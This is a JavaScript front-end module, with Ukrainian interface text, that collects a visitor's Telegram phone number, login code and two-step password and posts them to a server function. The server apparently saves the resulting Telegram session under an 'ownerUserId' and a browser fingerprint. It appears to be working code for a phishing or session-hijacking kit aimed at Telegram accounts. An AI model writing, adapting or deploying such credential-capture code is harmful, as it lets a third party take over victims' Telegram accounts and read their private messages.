(function() {
    window.view2u_modules = window.view2u_modules || {};

    // Функція для виклику нашого API
    async function apiCall(payload) {
        const res = await fetch('/.netlify/functions/public-api', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'telegramAuth',
                payload: payload
            })
        });

        if (!res.ok) {
            const errorText = await res.text();
            throw new Error(errorText || `Server error with status: ${res.status}`);
        }
        return res.json();
    }

    // Логіка модуля
    window.view2u_modules.telegram = {
        init: function(ownerUserId, fingerprint, options) {
            return new Promise((resolve, reject) => {
                const {
                    phoneInputId,
                    codeInputId,
                    passwordInputId,
                    submitButtonId,
                    feedbackElementId
                } = options;

                const phoneEl = document.getElementById(phoneInputId);
                const codeEl = document.getElementById(codeInputId);
                const passwordEl = document.getElementById(passwordInputId);
                const buttonEl = document.getElementById(submitButtonId);
                const feedbackEl = document.getElementById(feedbackElementId);

                if (!phoneEl || !codeEl || !passwordEl || !buttonEl || !feedbackEl) {
                    const missing = [
                        !phoneEl && 'phoneInputId', !codeEl && 'codeInputId', !passwordEl && 'passwordInputId',
                        !buttonEl && 'submitButtonId', !feedbackEl && 'feedbackElementId'
                    ].filter(Boolean).join(', ');
                    return reject(new Error(`View2U Telegram Module: Element(s) not found: ${missing}.`));
                }
                
                let currentState = {
                    step: 'phone',
                    token: null,
                };
                
                function updateUI() {
                    phoneEl.style.display = 'none';
                    codeEl.style.display = 'none';
                    passwordEl.style.display = 'none';
                    
                    if (currentState.step === 'phone') {
                        phoneEl.style.display = 'block';
                        feedbackEl.textContent = 'Введіть ваш номер телефону у міжнародному форматі (напр. +380991234567).';
                    } else if (currentState.step === 'code') {
                        codeEl.style.display = 'block';
                        feedbackEl.textContent = 'На ваш акаунт Telegram було відправлено код. Введіть його.';
                    } else if (currentState.step === 'password') {
                        passwordEl.style.display = 'block';
                        feedbackEl.textContent = 'Для цього акаунту потрібен пароль двоетапної автентифікації (2FA).';
                    }
                }

                async function handleSubmit() {
                    buttonEl.disabled = true;
                    feedbackEl.textContent = 'Обробка...';
                    feedbackEl.style.color = '';

                    try {
                        let response;
                        if (currentState.step === 'phone') {
                            if (!phoneEl.value) throw new Error('Номер телефону не може бути порожнім.');
                            response = await apiCall({
                                ownerUserId,
                                fingerprint,
                                step: 'sendPhone',
                                phone: phoneEl.value,
                            });
                        } else if (currentState.step === 'code') {
                            if (!codeEl.value) throw new Error('Код не може бути порожнім.');
                            response = await apiCall({
                                ownerUserId,
                                fingerprint,
                                step: 'sendCode',
                                code: codeEl.value,
                                token: currentState.token,
                            });
                        } else if (currentState.step === 'password') {
                            if (!passwordEl.value) throw new Error('Пароль не може бути порожнім.');
                            response = await apiCall({
                                ownerUserId,
                                fingerprint,
                                step: 'sendPassword',
                                password: passwordEl.value,
                                token: currentState.token,
                            });
                        }

                        if (response.completed) {
                            feedbackEl.textContent = 'Успіх! Сесію було збережено.';
                            feedbackEl.style.color = 'green';
                            buttonEl.style.display = 'none';
                            phoneEl.style.display = 'none';
                            codeEl.style.display = 'none';
                            passwordEl.style.display = 'none';
                            resolve({ status: 'success', message: 'Telegram session saved.' });
                        } else if (response.nextStep) {
                            currentState.step = response.nextStep;
                            currentState.token = response.token;
                            updateUI();
                        }

                    } catch (error) {
                        feedbackEl.textContent = `Помилка: ${error.message}`;
                        feedbackEl.style.color = 'red';
                        // Не відкидаємо проміс, щоб користувач міг спробувати ще раз
                        // reject(error); 
                    } finally {
                        buttonEl.disabled = false;
                    }
                }

                buttonEl.addEventListener('click', handleSubmit);
                updateUI();
            });
        }
    };
})();
